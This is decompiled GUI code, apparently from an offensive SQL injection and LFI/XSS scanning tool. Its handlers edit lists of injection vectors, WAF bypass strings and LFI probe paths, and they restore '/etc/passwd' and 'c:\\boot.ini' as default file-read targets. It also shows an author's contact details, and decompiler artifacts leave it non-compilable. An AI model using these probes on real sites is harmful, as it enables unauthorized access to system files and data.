	// Token: 0x06000F29 RID: 3881 RVA: 0x000682D0 File Offset: 0x000664D0
	private void method_118(object sender, EventArgs e)
	{
		int num;
		int num4;
		object obj;
		try
		{
			IL_02:
			ProjectData.ClearProjectError();
			num = -2;
			IL_0A:
			int num2 = 2;
			Clipboard.SetText("Jabber: c4rl0s@jabber.ru\r\nEmail: c4rl0s.pt@gmail.com");
			IL_16:
			num2 = 3;
			this.method_1(global::Globals.translate_0.GetStr(this, 52, ""));
			IL_30:
			num2 = 4;
			Interaction.Beep();
			IL_37:
			goto IL_A2;
			IL_39:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_5B:
			goto IL_97;
			IL_5D:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num > -2) ? num : 1);
			IL_75:;
		}
		catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_5D;
		}
		IL_97:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_A2:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000F2A RID: 3882 RVA: 0x00068398 File Offset: 0x00066598
	private void method_119(object sender, EventArgs e)
	{
		string text = "XXXXXXXXXXXXXXXX";
		char[] array = text.ToCharArray();
		Array.Reverse(array);
		text = new string(array);
		Clipboard.SetText(text);
		this.method_1(this.mnuAboutHWID.Text + " " + text);
	}

	// Token: 0x06000F2B RID: 3883 RVA: 0x00008593 File Offset: 0x00006793
	private void method_120(object sender, EventArgs e)
	{
		this.cmbSkin.SelectedIndex = checked(this.cmbSkin.SelectedIndex - 1);
	}

	// Token: 0x06000F2C RID: 3884 RVA: 0x000085AD File Offset: 0x000067AD
	private void method_121(object sender, EventArgs e)
	{
		this.cmbSkin.SelectedIndex = checked(this.cmbSkin.SelectedIndex + 1);
	}

	// Token: 0x06000F2D RID: 3885 RVA: 0x000683E4 File Offset: 0x000665E4
	private void method_122(object sender, EventArgs e)
	{
		if (this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$SkinState$Init == null)
		{
			Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$SkinState$Init, new StaticLocalInitFlag(), null);
		}
		bool flag = false;
		try
		{
			Monitor.Enter(this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$SkinState$Init, ref flag);
			if (this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$SkinState$Init.State == 0)
			{
				this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$SkinState$Init.State = 2;
				this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$SkinState = 0;
			}
			else if (this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$SkinState$Init.State == 2)
			{
				throw new IncompleteInitialization();
			}
		}
		finally
		{
			this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$SkinState$Init.State = 1;
			if (flag)
			{
				Monitor.Exit(this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$SkinState$Init);
			}
		}
		Cursor.Current = Cursors.WaitCursor;
		Application.DoEvents();
		try
		{
			if (this.bool_2)
			{
				if (this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$LastIndex$Init == null)
				{
					Interlocked.CompareExchange<StaticLocalInitFlag>(ref this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$LastIndex$Init, new StaticLocalInitFlag(), null);
				}
				bool flag2 = false;
				try
				{
					Monitor.Enter(this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$LastIndex$Init, ref flag2);
					if (this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$LastIndex$Init.State == 0)
					{
						this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$LastIndex$Init.State = 2;
						this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$LastIndex = -1;
					}
					else if (this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$LastIndex$Init.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				finally
				{
					this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$LastIndex$Init.State = 1;
					if (flag2)
					{
						Monitor.Exit(this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$LastIndex$Init);
					}
				}
				if (string.IsNullOrEmpty(Conversions.ToString(this.cmbSkin.SelectedItem)))
				{
					this.cmbSkin.SelectedItem = RuntimeHelpers.GetObjectValue(this.cmbSkin.Items[6]);
				}
				if (this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$SkinState <= 0)
				{
				}
				if (this.chkSkin.Checked)
				{
					switch (this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$SkinState)
					{
					case 0:
						this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$SkinState = 1;
						break;
					case 2:
						VisualStyler.RestoreApplicationSkin();
						this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$SkinState = 1;
						break;
					}
					if (this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$LastIndex != this.cmbSkin.SelectedIndex)
					{
						this.VisualStyler1.LoadVisualStyle(this.Descompress(Assembly.GetExecutingAssembly().GetManifestResourceStream(Conversions.ToString(Operators.ConcatenateObject(this.cmbSkin.SelectedItem, ".bin")))));
					}
				}
				else
				{
					switch (this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$SkinState)
					{
					case 1:
						VisualStyler.RemoveApplicationSkin();
						this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$SkinState = 2;
						break;
					}
				}
				if (this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$SkinState > 0)
				{
					this.VisualStyler1.Refresh();
				}
				if (this.chkSkin.Checked)
				{
					this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$LastIndex = this.cmbSkin.SelectedIndex;
				}
			}
			this.btnSkinP.Enabled = (this.cmbSkin.SelectedIndex > 0);
			this.btnSkinN.Enabled = (this.cmbSkin.SelectedIndex < checked(this.cmbSkin.Items.Count - 1));
		}
		catch (Exception ex)
		{
			Interaction.MsgBox(ex.ToString(), MsgBoxStyle.OkOnly, null);
		}
		finally
		{
			if (this.$STATIC$cmbSkin_SelectedIndexChanged$20211C12819D$SkinState > 0)
			{
				Cursor.Current = Cursors.Default;
			}
		}
	}

	// Token: 0x06000F2E RID: 3886 RVA: 0x0006870C File Offset: 0x0006690C
	private void method_123(object sender, EventArgs e)
	{
		this.cmbSkin.Enabled = this.chkSkin.Checked;
		this.method_122(null, null);
		this.btnSkinP.Enabled = (this.chkSkin.Checked & this.cmbSkin.SelectedIndex > 0);
		this.btnSkinN.Enabled = (this.chkSkin.Checked & this.cmbSkin.SelectedIndex < checked(this.cmbSkin.Items.Count - 1));
	}

	// Token: 0x06000F2F RID: 3887 RVA: 0x00068794 File Offset: 0x00066994
	private void method_124(object sender, CancelEventArgs e)
	{
		if (this.mnuPaths.SourceControl is ListViewExt)
		{
			this.mnuPathEdit.Visible = (((ListViewExt)this.mnuPaths.SourceControl).SelectedItems.Count == 1);
			this.mnuPathRem.Visible = (((ListViewExt)this.mnuPaths.SourceControl).SelectedItems.Count == 1);
		}
		else
		{
			this.mnuPathEdit.Visible = (((CheckedListBox)this.mnuPaths.SourceControl).SelectedItems.Count == 1);
			this.mnuPathRem.Visible = (((CheckedListBox)this.mnuPaths.SourceControl).SelectedItems.Count == 1);
		}
	}

	// Token: 0x06000F30 RID: 3888 RVA: 0x00068858 File Offset: 0x00066A58
	private void method_125(object sender, EventArgs e)
	{
		if (this.mnuPaths.SourceControl is ListViewExt)
		{
			List<string> list = new List<string>();
			ListViewExt listViewExt;
			if (this.mnuPaths.SourceControl == this.lvwLFIpathLinux)
			{
				listViewExt = this.lvwLFIpathLinux;
			}
			else if (this.mnuPaths.SourceControl == this.lvwLFIpathWin)
			{
				listViewExt = this.lvwLFIpathWin;
			}
			else if (this.mnuPaths.SourceControl == this.lvwWafs)
			{
				listViewExt = this.lvwWafs;
			}
			else
			{
				listViewExt = this.lvwXSS;
			}
			if (listViewExt == this.lvwWafs)
			{
				using (WafAdd wafAdd = new WafAdd())
				{
					wafAdd.ShowDialog(this);
					if (wafAdd.DialogResult == DialogResult.OK)
					{
						ListViewItem listViewItem = new ListViewItem(wafAdd.txtOutset.Text);
						listViewItem.SubItems.Add(wafAdd.txtEnding.Text);
						listViewExt.Items.Add(listViewItem);
						listViewExt.Sort();
					}
					return;
				}
			}
			try
			{
				foreach (object obj in listViewExt.Items)
				{
					ListViewItem listViewItem2 = (ListViewItem)obj;
					list.Add(listViewItem2.Text);
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			using (PathAdd pathAdd = new PathAdd(list, listViewExt == this.lvwLFIpathWin, listViewExt == this.lvwXSS))
			{
				pathAdd.ShowDialog(this);
				if (listViewExt == this.lvwXSS)
				{
					pathAdd.Text = global::Globals.translate_0.GetStr(this, 113, "") + listViewExt.SelectedItems[0].Text;
					pathAdd.Label1.Text = global::Globals.translate_0.GetStr(this, 112, "");
				}
				if (pathAdd.DialogResult == DialogResult.OK)
				{
					ListViewItem listViewItem3 = new ListViewItem(pathAdd.txtPath.Text);
					listViewItem3.SubItems.Add(pathAdd.txtKeyword.Text);
					listViewExt.Items.Add(listViewItem3);
					listViewExt.Sort();
				}
				return;
			}
		}
		List<string> list2 = new List<string>();
		CheckedListBox checkedListBox;
		if (this.mnuPaths.SourceControl == this.lstAnalizerUnion)
		{
			checkedListBox = this.lstAnalizerUnion;
		}
		else
		{
			checkedListBox = this.lstAnalizerError;
		}
		try
		{
			foreach (object value in checkedListBox.Items)
			{
				string item = Conversions.ToString(value);
				list2.Add(item);
			}
		}
		finally
		{
			IEnumerator enumerator2;
			if (enumerator2 is IDisposable)
			{
				(enumerator2 as IDisposable).Dispose();
			}
		}
		using (VectorsAdd vectorsAdd = new VectorsAdd(list2))
		{
			vectorsAdd.ShowDialog(this);
			if (vectorsAdd.DialogResult == DialogResult.OK)
			{
				checkedListBox.Items.Add(vectorsAdd.txtVector.Text, true);
			}
		}
	}

	// Token: 0x06000F31 RID: 3889 RVA: 0x00068B74 File Offset: 0x00066D74
	private void method_126(object sender, EventArgs e)
	{
		if (this.mnuPaths.SourceControl is ListViewExt)
		{
			List<string> list = new List<string>();
			ListViewExt listViewExt;
			if (this.mnuPaths.SourceControl == this.lvwLFIpathLinux)
			{
				listViewExt = this.lvwLFIpathLinux;
			}
			else if (this.mnuPaths.SourceControl == this.lvwLFIpathWin)
			{
				listViewExt = this.lvwLFIpathWin;
			}
			else if (this.mnuPaths.SourceControl == this.lvwWafs)
			{
				listViewExt = this.lvwWafs;
			}
			else
			{
				listViewExt = this.lvwXSS;
			}
			if (listViewExt == this.lvwWafs)
			{
				using (WafAdd wafAdd = new WafAdd())
				{
					wafAdd.Text = global::Globals.translate_0.GetStr(this, 53, "") + listViewExt.SelectedItems[0].Text;
					wafAdd.txtOutset.Text = listViewExt.SelectedItems[0].Text;
					wafAdd.txtEnding.Text = listViewExt.SelectedItems[0].SubItems[1].Text;
					wafAdd.ShowDialog(this);
					if (wafAdd.DialogResult == DialogResult.OK)
					{
						listViewExt.SelectedItems[0].Text = wafAdd.txtOutset.Text;
						listViewExt.SelectedItems[0].SubItems[1].Text = wafAdd.txtEnding.Text;
						listViewExt.Sort();
					}
					return;
				}
			}
			try
			{
				foreach (object obj in listViewExt.Items)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					if (!listViewItem.Selected)
					{
						list.Add(listViewItem.Text);
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
			using (PathAdd pathAdd = new PathAdd(list, listViewExt == this.lvwLFIpathWin, listViewExt == this.lvwXSS))
			{
				if (listViewExt == this.lvwXSS)
				{
					pathAdd.Text = global::Globals.translate_0.GetStr(this, 114, "") + listViewExt.SelectedItems[0].Text;
					pathAdd.Label1.Text = global::Globals.translate_0.GetStr(this, 112, "");
				}
				else
				{
					pathAdd.Text = global::Globals.translate_0.GetStr(this, 54, "") + listViewExt.SelectedItems[0].Text;
				}
				pathAdd.txtPath.Text = listViewExt.SelectedItems[0].Text;
				pathAdd.txtKeyword.Text = listViewExt.SelectedItems[0].SubItems[1].Text;
				pathAdd.ShowDialog(this);
				if (pathAdd.DialogResult == DialogResult.OK)
				{
					listViewExt.SelectedItems[0].Text = pathAdd.txtPath.Text;
					listViewExt.SelectedItems[0].SubItems[1].Text = pathAdd.txtKeyword.Text;
					listViewExt.Sort();
				}
				return;
			}
		}
		List<string> list2 = new List<string>();
		CheckedListBox checkedListBox;
		if (this.mnuPaths.SourceControl == this.lstAnalizerUnion)
		{
			checkedListBox = this.lstAnalizerUnion;
		}
		else
		{
			checkedListBox = this.lstAnalizerError;
		}
		try
		{
			foreach (object value in checkedListBox.Items)
			{
				string item = Conversions.ToString(value);
				list2.Add(item);
			}
		}
		finally
		{
			IEnumerator enumerator2;
			if (enumerator2 is IDisposable)
			{
				(enumerator2 as IDisposable).Dispose();
			}
		}
		using (VectorsAdd vectorsAdd = new VectorsAdd(list2))
		{
			vectorsAdd.Text = Conversions.ToString(Operators.ConcatenateObject(global::Globals.translate_0.GetStr(this, 55, ""), checkedListBox.SelectedItems[0]));
			vectorsAdd.txtVector.Text = Conversions.ToString(checkedListBox.SelectedItem);
			vectorsAdd.ShowDialog(this);
			if (vectorsAdd.DialogResult == DialogResult.OK)
			{
				checkedListBox.Items[checkedListBox.SelectedIndex] = vectorsAdd.txtVector.Text;
			}
		}
	}

	// Token: 0x06000F32 RID: 3890 RVA: 0x00069024 File Offset: 0x00067224
	private void method_127(object sender, EventArgs e)
	{
		if (this.mnuPaths.SourceControl is ListViewExt)
		{
			ListViewExt listViewExt;
			if (this.mnuPaths.SourceControl == this.lvwLFIpathLinux)
			{
				listViewExt = this.lvwLFIpathLinux;
			}
			else if (this.mnuPaths.SourceControl == this.lvwLFIpathWin)
			{
				listViewExt = this.lvwLFIpathWin;
			}
			else if (this.mnuPaths.SourceControl == this.lvwWafs)
			{
				listViewExt = this.lvwWafs;
			}
			else
			{
				listViewExt = this.lvwXSS;
			}
			listViewExt.Items.Remove(listViewExt.SelectedItems[0]);
			if (listViewExt.Items.Count == 0)
			{
				if (listViewExt == this.lvwLFIpathLinux)
				{
					ListViewItem listViewItem = new ListViewItem("/etc/passwd");
					listViewItem.SubItems.Add("root:/bin/bash");
					listViewExt.Items.Add(listViewItem);
				}
				else if (listViewExt == this.lvwLFIpathWin)
				{
					ListViewItem listViewItem2 = new ListViewItem("c:\\\\boot.ini");
					listViewItem2.SubItems.Add("default=multi(");
					listViewExt.Items.Add(listViewItem2);
				}
				else if (listViewExt != this.lvwWafs && listViewExt == this.lvwXSS)
				{
				}
			}
		}
		else
		{
			CheckedListBox checkedListBox;
			if (this.mnuPaths.SourceControl == this.lstAnalizerUnion)
			{
				checkedListBox = this.lstAnalizerUnion;
			}
			else
			{
				checkedListBox = this.lstAnalizerError;
			}
			checkedListBox.Items.Remove(RuntimeHelpers.GetObjectValue(checkedListBox.SelectedItem));
			this.method_93(null, null);
		}
	}

	// Token: 0x06000F33 RID: 3891 RVA: 0x000691A0 File Offset: 0x000673A0
	private void method_128(object sender, EventArgs e)
	{
		this.txtHexValue.Text = "";
		this.txtTextValue.Text = "";
		this.txtSQLCharValue.Text = "";
		this.txtResolveAddress.Text = "";
		this.numPingPort.Value = 80m;
	}

	// Token: 0x06000F34 RID: 3892 RVA: 0x00069200 File Offset: 0x00067400
	private void method_129(object sender, EventArgs e)
	{
		bool enabled = !string.IsNullOrEmpty(this.txtTextValue.Text);
		this.btnConvertTextToHex.Enabled = enabled;
		this.butTextToSQLChar.Enabled = enabled;
		this.btnTextToURLEnconding.Enabled = enabled;
		this.btnTextToBase64.Enabled = enabled;
	}

	// Token: 0x06000F35 RID: 3893 RVA: 0x00069254 File Offset: 0x00067454
	private void method_130(object sender, EventArgs e)
	{
		bool enabled = !string.IsNullOrEmpty(this.txtHexValue.Text);
		this.btnHexToText.Enabled = enabled;
		this.btnURLDecondingToText.Enabled = enabled;
		this.btnBase64ToText.Enabled = enabled;
	}

	// Token: 0x06000F36 RID: 3894 RVA: 0x0006929C File Offset: 0x0006749C
	private void method_131(object sender, EventArgs e)
	{
		try
		{
			this.txtHexValue.Text = Class23.smethod_7(this.txtTextValue.Text);
		}
		catch (Exception ex)
		{
			this.txtTextValue.Text = ex.Message;
		}
	}

	// Token: 0x06000F37 RID: 3895 RVA: 0x000692F8 File Offset: 0x000674F8
	private void method_132(object sender, EventArgs e)
	{
		try
		{
			this.txtTextValue.Text = Class23.smethod_8(this.txtHexValue.Text);
		}
		catch (Exception ex)
		{
			this.txtTextValue.Text = ex.Message;
		}
	}

	// Token: 0x06000F38 RID: 3896 RVA: 0x00069354 File Offset: 0x00067554
	private void method_133(object sender, EventArgs e)
	{
		try
		{
			this.txtHexValue.Text = Class15.smethod_0(this.txtTextValue.Text);
		}
		catch (Exception ex)
		{
			this.txtHexValue.Text = ex.Message;
		}
	}

	// Token: 0x06000F39 RID: 3897 RVA: 0x000693B0 File Offset: 0x000675B0
	private void method_134(object sender, EventArgs e)
	{
		try
		{
			this.txtTextValue.Text = Class15.smethod_1(this.txtHexValue.Text);
		}
		catch (Exception ex)
		{
			this.txtTextValue.Text = ex.Message;
		}
	}

	// Token: 0x06000F3A RID: 3898 RVA: 0x0006940C File Offset: 0x0006760C
	private void method_135(object sender, EventArgs e)
	{
		try
		{
			this.txtHexValue.Text = Class23.smethod_20(this.txtTextValue.Text);
		}
		catch (Exception ex)
		{
			this.txtHexValue.Text = ex.Message;
		}
	}

	// Token: 0x06000F3B RID: 3899 RVA: 0x00069468 File Offset: 0x00067668
	private void method_136(object sender, EventArgs e)
	{
		try
		{
			this.txtTextValue.Text = Class23.smethod_19(this.txtHexValue.Text);
		}
		catch (Exception ex)
		{
			this.txtTextValue.Text = ex.Message;
		}
	}

	// Token: 0x06000F3C RID: 3900 RVA: 0x000694C4 File Offset: 0x000676C4
	private void method_137(object sender, EventArgs e)
	{
		try
		{
			if (this.chkGroupChar.Checked)
			{
				this.txtSQLCharValue.Text = Class23.smethod_21(this.txtTextValue.Text, this.chkGroupChar.Checked, "+", "char");
			}
			else
			{
				this.txtSQLCharValue.Text = Class23.smethod_21(this.txtTextValue.Text, this.chkGroupChar.Checked, this.txtSQLCharDelimiter.Text, this.cmbSQLChar.Text);
			}
		}
		catch (Exception ex)
		{
			this.txtSQLCharValue.Text = ex.Message;
		}
	}

	// Token: 0x06000F3D RID: 3901 RVA: 0x000085C7 File Offset: 0x000067C7
	private void method_138(object sender, EventArgs e)
	{
		this.txtSQLCharDelimiter.Enabled = !this.chkGroupChar.Checked;
		this.cmbSQLChar.Enabled = !this.chkGroupChar.Checked;
	}

	// Token: 0x06000F3E RID: 3902 RVA: 0x000085FB File Offset: 0x000067FB
	private void method_139(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(this.txtSQLCharDelimiter.Text))
		{
			this.txtSQLCharDelimiter.Text = "+";
		}
	}

	// Token: 0x06000F3F RID: 3903 RVA: 0x00069580 File Offset: 0x00067780
	private void method_140(object sender, EventArgs e)
	{
		string text = "";
		this.btnPing.Enabled = false;
		this.Cursor = Cursors.WaitCursor;
		Application.DoEvents();
		try
		{
			bool flag = Class22.smethod_0(this.txtResolveAddress.Text, Convert.ToInt32(this.numPingPort.Value), text);
		}
		catch (Exception ex)
		{
			text = ex.Message;
		}
		finally
		{
			if (string.IsNullOrEmpty(text))
			{
				text = global::Globals.translate_0.GetStr(this, 56, "");
			}
			this.btnPing.Enabled = true;
			this.Cursor = Cursors.Default;
			using (new Class8(this))
			{
				bool flag;
				if (flag)
				{
					MessageBox.Show(global::Globals.translate_0.GetStr(this, 57, ""), this.Text, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				else
				{
					MessageBox.Show(text, this.Text, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
				}
			}
		}
	}

	// Token: 0x06000F40 RID: 3904 RVA: 0x00069690 File Offset: 0x00067890
	private void method_141(object sender, EventArgs e)
	{
		this.txtResolveIP.Text = "";
		this.txtResolveCountry.Text = "";
		this.picResolveFlag.Image = null;
		this.btnPing.Enabled = (this.txtResolveAddress.Text.Length > 3);
	}

	// Token: 0x06000F41 RID: 3905 RVA: 0x000696E8 File Offset: 0x000678E8
	private void method_142(object sender, EventArgs e)
	{
		try
		{
			this.txtResolveCountry.Text = "";
			this.picResolveFlag.Image = null;
			this.txtResolveAddress.Text = this.txtResolveAddress.Text.Replace(" ", "");
			bool flag;
			string string_;
			if ((flag = true) == this.txtResolveAddress.Text.ToLower().StartsWith("http"))
			{
				string[] array = Regex.Split(this.txtResolveAddress.Text.Trim(), "/");
				if (Information.IsNothing(array))
				{
					goto IL_1A8;
				}
				if (array.Length < 2)
				{
					goto IL_1A8;
				}
				string_ = array[2];
			}
			else if (flag == this.txtResolveAddress.Text.Contains(":"))
			{
				string_ = this.txtResolveAddress.Text.Split(new char[]
				{
					':'
				})[0];
			}
			else
			{
				string_ = this.txtResolveAddress.Text;
			}
			this.txtResolveIP.Text = this.method_85(string_).ToString();
			DataGP g_DataGP = global::Globals.G_DataGP;
			string text = this.txtResolveIP.Text;
			TextBox txtResolveCountry;
			string text2 = (txtResolveCountry = this.txtResolveCountry).Text;
			PictureBox picResolveFlag;
			Image image = (picResolveFlag = this.picResolveFlag).Image;
			string text3 = "";
			g_DataGP.Lookup(text, ref text2, ref image, ref text3, true);
			picResolveFlag.Image = image;
			txtResolveCountry.Text = text2;
			if (Operators.CompareString(this.txtResolveCountry.Text, "[--] N/A", false) == 0)
			{
				this.txtResolveCountry.Clear();
				this.picResolveFlag.Visible = false;
			}
			else
			{
				this.picResolveFlag.Visible = true;
			}
			return;
		}
		catch (Exception ex)
		{
		}
		IL_1A8:
		this.method_1(global::Globals.translate_0.GetStr(this, 58, ""));
		Interaction.Beep();
	}

	// Token: 0x06000F42 RID: 3906 RVA: 0x000698D8 File Offset: 0x00067AD8
	private void method_143(object sender, CancelEventArgs e)
	{
		e.Cancel = (global::Globals.GTrash.method_3() == 0);
		this.mnuTrashClippboard.Enabled = (this.dtgTrash.SelectedRows.Count > 0);
		this.mnuTrashRemove.Enabled = (this.dtgTrash.SelectedRows.Count > 0);
		this.mnuTrashCount.Text = global::Globals.translate_0.GetStr(this, 59, "") + global::Globals.FormatNumbers(global::Globals.GTrash.method_3(), true);
	}

	// Token: 0x06000F43 RID: 3907 RVA: 0x0000861F File Offset: 0x0000681F
	private void method_144(object sender, EventArgs e)
	{
		global::Globals.GTrash.method_7();
	}

	// Token: 0x06000F44 RID: 3908 RVA: 0x00069968 File Offset: 0x00067B68
	private void method_145(object sender, EventArgs e)
	{
		try
		{
			System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
			if (this.dtgQueue.SelectedRows.Count == 1)
			{
				stringBuilder.AppendLine(Conversions.ToString(this.dtgTrash.SelectedRows[0].Cells[0].Value));
			}
			else
			{
				try
				{
					foreach (object obj in this.dtgTrash.SelectedRows)
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						stringBuilder.AppendLine(Conversions.ToString(dataGridViewRow.Cells[0].Value));
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			Clipboard.SetText(stringBuilder.ToString());
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	// Token: 0x06000F45 RID: 3909 RVA: 0x0000862B File Offset: 0x0000682B
	private void method_146(object sender, EventArgs e)
	{
		this.dtgTrash.SelectAll();
	}

	// Token: 0x06000F46 RID: 3910 RVA: 0x00069A60 File Offset: 0x00067C60
	private void method_147(object sender, EventArgs e)
	{
		using (new Class8(this))
		{
			if (MessageBox.Show(global::Globals.translate_0.GetStr(this, 60, "") + "\r\n" + global::Globals.FormatNumbers(global::Globals.GTrash.method_3(), true), this.Text, MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.Yes)
			{
				global::Globals.GTrash.method_4();
			}
		}
	}

	// Token: 0x06000F47 RID: 3911 RVA: 0x00069AE0 File Offset: 0x00067CE0
	private void method_148(object sender, EventArgs e)
	{
		try
		{
			try
			{
				foreach (object obj in this.dtgTrash.SelectedRows)
				{
					DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
					string text = Conversions.ToString(dataGridViewRow.Cells[0].Value);
					global::Globals.GTrash.method_1(text);
					this.dtgTrash.Rows.Remove(dataGridViewRow);
					if (DateAndTime.Now.Second % 2 == 0)
					{
						Application.DoEvents();
					}
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	// Token: 0x06000F48 RID: 3912 RVA: 0x00069BB4 File Offset: 0x00067DB4
	private void method_149(object sender, KeyEventArgs e)
	{
		if (e.Control)
		{
			if (e.KeyCode == Keys.A)
			{
				this.method_146(null, null);
			}
		}
		else if (this.dtgQueue.SelectedRows.Count > 0)
		{
			Keys keyCode = e.KeyCode;
			if (keyCode == Keys.Delete)
			{
				this.method_148(null, null);
			}
		}
	}

	// Token: 0x06000F49 RID: 3913 RVA: 0x00069C0C File Offset: 0x00067E0C
	private void method_150(object sender, EventArgs e)
	{
		using (AddURLs addURLs = new AddURLs())
		{
			addURLs.Text = this.mnuQueueAddURLs.Text;
			addURLs.ShowDialog(this);
			if (addURLs.DialogResult == DialogResult.OK)
			{
				List<string> list = new List<string>();
				list.AddRange(addURLs.txtURLs.Lines);
				global::Globals.GQueue.method_12();
				global::Globals.GQueue.method_3(list);
				Class37.Struct4 @struct = global::Globals.GQueue.method_13();
				if (@struct.int_7 > 1)
				{
					using (new Class8(this))
					{
						MessageBox.Show(string.Concat(new string[]
						{
							global::Globals.translate_0.GetStr(this, 72, ""),
							global::Globals.FormatNumbers(@struct.int_7, false),
							"\r\n",
							global::Globals.translate_0.GetStr(this, 73, ""),
							global::Globals.FormatNumbers(@struct.int_6, false),
							"\r\n",
							global::Globals.translate_0.GetStr(this, 74, ""),
							global::Globals.FormatNumbers(@struct.int_1, false),
							"\r\n",
							global::Globals.translate_0.GetStr(this, 75, ""),
							global::Globals.FormatNumbers(@struct.int_5, false),
							"\r\n",
							global::Globals.translate_0.GetStr(this, 76, ""),
							global::Globals.FormatNumbers(@struct.int_2, false),
							"\r\n",
							global::Globals.translate_0.GetStr(this, 77, ""),
							global::Globals.FormatNumbers(@struct.int_3, false),
							"\r\n",
							global::Globals.translate_0.GetStr(this, 78, ""),
							global::Globals.FormatNumbers(@struct.int_4, false),
							"\r\n",
							global::Globals.translate_0.GetStr(this, 79, ""),
							global::Globals.FormatNumbers(@struct.int_0, false)
						}), addURLs.Text, MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
					}
				}
			}
		}
	}

	// Token: 0x06000F4A RID: 3914 RVA: 0x000027EC File Offset: 0x000009EC
	private void method_151(object sender, CancelEventArgs e)
	{
	}

	// Token: 0x06000F4B RID: 3915 RVA: 0x00008638 File Offset: 0x00006838
	private void method_152(object sender, EventArgs e)
	{
		global::Globals.ShellUrl(Conversions.ToString(this.dtgQueue.SelectedRows[0].Cells[0].Value));
	}

	// Token: 0x06000F4C RID: 3916 RVA: 0x00069E60 File Offset: 0x00068060
	private void method_153(object sender, EventArgs e)
	{
		try
		{
			System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
			if (this.dtgQueue.SelectedRows.Count == 1)
			{
				stringBuilder.AppendLine(Conversions.ToString(this.dtgQueue.SelectedRows[0].Cells[0].Value));
			}
			else
			{
				try
				{
					foreach (object obj in this.dtgQueue.SelectedRows)
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						stringBuilder.AppendLine(Conversions.ToString(dataGridViewRow.Cells[0].Value));
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			Clipboard.SetText(stringBuilder.ToString());
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message);
		}
	}

	// Token: 0x06000F4D RID: 3917 RVA: 0x00008665 File Offset: 0x00006865
	private void method_154(object sender, EventArgs e)
	{
		this.dtgQueue.SelectAll();
	}

	// Token: 0x06000F4E RID: 3918 RVA: 0x00069F58 File Offset: 0x00068158
	private void method_155(object sender, EventArgs e)
	{
		try
		{
			this.mnuQueue.Enabled = false;
			this.tsWorker.Enabled = false;
			List<string> list = new List<string>();
			if (sender != this.mnuQueueRomove || this.dtgQueue.SelectedRows.Count != this.dtgQueue.RowCount)
			{
				try
				{
					foreach (object obj in this.dtgQueue.SelectedRows)
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						string item = Conversions.ToString(dataGridViewRow.Cells[0].Value);
						list.Add(item);
						if (sender == this.mnuQueueTrash)
						{
							global::Globals.GTrash.method_0(item);
						}
						if (DateAndTime.Now.Second % 2 == 0)
						{
							Application.DoEvents();
						}
					}
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			if (this.dtgQueue.SelectedRows.Count == this.dtgQueue.RowCount)
			{
				global::Globals.GQueue.method_7();
			}
			else
			{
